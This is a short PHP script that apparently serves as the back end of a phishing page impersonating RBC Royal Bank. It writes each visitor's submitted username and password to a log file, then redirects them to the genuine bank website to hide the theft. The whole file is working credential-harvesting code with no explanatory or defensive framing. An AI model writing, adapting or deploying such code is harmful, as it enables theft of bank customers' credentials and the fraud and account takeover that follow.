<?php 
file_put_contents("logs.txt", "Username: " . $_POST['name'] . " Pass: " . $_POST['password'] ."\n", FILE_APPEND);
header('Location: https://www.rbcroyalbank.com/');
exit();
?>